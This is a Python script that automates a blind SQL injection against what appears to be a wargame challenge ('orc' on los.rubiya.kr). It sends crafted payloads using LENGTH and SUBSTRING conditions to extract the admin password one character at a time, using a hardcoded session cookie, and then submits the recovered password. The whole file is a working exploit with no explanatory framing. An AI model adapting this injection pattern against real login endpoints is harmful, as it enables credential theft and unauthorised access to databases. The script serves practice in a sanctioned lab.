import string
import requests


def find_password_length(n):
    payload = f"?pw=' or LENGTH(pw)={n} and id='admin"
    if 'Hello admin' in send_request(payload):
        return n


def find_password(position, char):
    payload = f"?pw=' or SUBSTRING(pw,{position},1)='{char}' and id='admin"
    if 'Hello admin' in send_request(payload):
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
    cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    pw = []
    characters = string.printable

    for i in range(100):
        if find_password_length(i):
            length = i
            print(f'pw length is {length}')
            break

    for i in range(1, length + 1):
        for char in characters:
            if find_password(i, char):
                pw.append(char.lower())
                print(f'pw = {pw}')
                break

    print(f'pw={"".join(pw)}')

    if 'ORC Clear!' in send_request(f'?pw={"".join(pw)}'):
        print('ORC Clear!')
    else:
        print('Something went wrong!!!')
